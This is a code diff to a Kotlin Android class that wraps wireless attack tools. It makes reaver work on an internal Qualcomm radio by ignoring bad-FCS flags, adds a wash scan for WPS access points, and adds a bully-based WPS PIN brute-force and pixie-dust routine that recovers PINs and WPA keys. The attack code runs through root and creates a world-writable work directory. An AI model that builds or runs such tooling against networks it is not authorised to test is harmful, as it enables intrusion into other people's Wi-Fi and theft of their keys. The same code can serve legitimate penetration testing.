@@ -210,7 +210,10 @@ class WifiTools(context: Context) {
         if (!hasTool("reaver")) return "reaver not installed."
         val ch = channel.takeIf { it > 0 }?.let { "-c $it" } ?: ""
         val k = if (pixie) "-K" else ""
-        val full = runAttack("timeout $secs ${path("reaver")} -i $iface -b $bssid $ch -vv -N $k", out)
+        // -F (--ignore-fcs): the qcacld internal monitor stamps a (false) bad-FCS flag on
+        // every frame, which reaver otherwise drops ("bad FCS, skipping") so it never sees a
+        // beacon. Ignoring it makes reaver work on the internal radio, not just an OTG one.
+        val full = runAttack("timeout $secs ${path("reaver")} -i $iface -b $bssid $ch -vv -N -F $k", out)
         return summariseReaver(full, secs)
     }
 
@@ -222,7 +225,8 @@ class WifiTools(context: Context) {
         if (!bssid.matches(MAC)) return "invalid bssid"
         if (!hasTool("reaver")) return "reaver not installed."
         val ch = channel.takeIf { it > 0 }?.let { "-c $it" } ?: ""
-        val full = runAttack("timeout $secs ${path("reaver")} -i $iface -b $bssid $ch -vv -N -p ''", out)
+        // -F: ignore the internal monitor's false bad-FCS flag (see wps()).
+        val full = runAttack("timeout $secs ${path("reaver")} -i $iface -b $bssid $ch -vv -N -F -p ''", out)
         return summariseReaver(full, secs)
     }
 
@@ -231,6 +235,52 @@ class WifiTools(context: Context) {
             .filter { Regex("WPS PIN|WPA PSK|pixie|locked|rate limit|not found|empty pin", RegexOption.IGNORE_CASE).containsMatchIn(it) }
             .toList().takeLast(20).joinToString("\n")
             .ifBlank { "reaver ran up to ${secs}s, no PIN/PSK recovered." }
+
+    /** A WPS-capable AP as reported by wash. */
+    data class WpsAp(val bssid: String, val channel: Int, val locked: Boolean, val version: String)
+
+    /**
+     * Passive WPS discovery with wash: hops the band (or stays on [channel]) and lists APs
+     * advertising WPS plus their lock state. `-F` ignores the false bad-FCS flag the qcacld
+     * internal monitor stamps on every frame, so this works on the internal radio, not only an
+     * OTG adapter. Streams the raw table to [out]; returns the parsed WPS APs.
+     */
+    fun washScan(iface: String, channel: Int = 0, secs: Int = 30, out: String? = null): List<WpsAp> {
+        if (!WifiIface.valid(iface) || !hasTool("wash")) return emptyList()
+        val ch = channel.takeIf { it > 0 }?.let { "-c $it" } ?: ""
+        val full = runAttack("timeout $secs ${path("wash")} -i $iface -F -a $ch", out)
+        // columns: BSSID  Ch  dBm  WPS  Lck  Vendor  ESSID — a real WPS row has a version (1.0/2.0).
+        val row = Regex("^\\s*([0-9A-Fa-f:]{17})\\s+(\\d+)\\s+-?\\d+\\s+(\\d\\.\\d)\\s+(Yes|No)\\b")
+        return full.lineSequence().mapNotNull { line ->
+            val m = row.find(line) ?: return@mapNotNull null
+            WpsAp(m.groupValues[1].uppercase(), m.groupValues[2].toIntOrNull() ?: 0,
+                m.groupValues[4].equals("Yes", true), m.groupValues[3])
+        }.distinctBy { it.bssid }.toList()
+    }
+
+    /**
+     * WPS PIN brute / pixie-dust with bully — a reaver alternative that also runs on the qcacld
+     * internal monitor: `-C` skips bad-FCS validation, and because bully sets the channel over
+     * the WEXT ioctl this driver doesn't support, we pre-set it with iw (nl80211) and ship a
+     * bully patched to treat that ioctl failure as non-fatal. Streams to [out].
+     */
+    fun wpsBully(iface: String, bssid: String, channel: Int, pixie: Boolean, secs: Int = 150, out: String? = null): String {
+        if (!bssid.matches(MAC)) return "invalid bssid"
+        if (!hasTool("bully")) return "bully not installed."
+        if (channel > 0) exec("iw dev $iface set channel $channel 2>/dev/null")
+        val ch = channel.takeIf { it > 0 }?.let { "-c $it" } ?: ""
+        val d = if (pixie) "-d" else ""
+        // bully's -w writability check rejects the app dir's 0700 perms, so give it a 0777
+        // subdir for its pin/session files.
+        val bwork = "$workDir/bully"
+        Root.run("mkdir -p '$bwork'; chmod 777 '$bwork'")
+        val full = runAttack(
+            "timeout $secs ${path("bully")} $iface -b $bssid $ch -v 3 -C -F $d -w $bwork", out)
+        return full.lineSequence()
+            .filter { Regex("PIN|PSK|pixie|Key|lock|cracked|found", RegexOption.IGNORE_CASE).containsMatchIn(it) }
+            .toList().takeLast(20).joinToString("\n")
+            .ifBlank { "bully ran up to ${secs}s, no PIN/PSK recovered." }
+    }
 
     // ---- library: handshakes, cracked keys, wordlists, cleanup ----------------
 
